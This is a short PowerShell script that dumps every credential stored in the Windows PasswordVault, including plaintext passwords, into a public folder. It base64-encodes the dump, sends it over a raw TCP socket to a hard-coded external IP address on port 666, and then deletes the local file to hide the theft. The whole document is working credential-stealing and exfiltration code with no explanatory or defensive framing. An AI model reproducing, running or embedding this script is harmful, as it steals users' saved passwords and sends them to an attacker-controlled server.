[void][Windows.Security.Credentials.PasswordVault, Windows.Security.Credentials, ContentType = WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault
$allpass = $vault.RetrieveAll() | % { $_.RetrievePassword(); $_ } >> C:\Users\Public\passwords.txt
$test=[System.Convert]::ToBase64String([io.file]::ReadAllBytes("C:\Users\Public\passwords.txt"));
$socket = New-Object net.sockets.tcpclient('209.151.149.234',666);
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$writer.WriteLine($test);
$socket.close()
del C:\Users\Public\passwords.txt
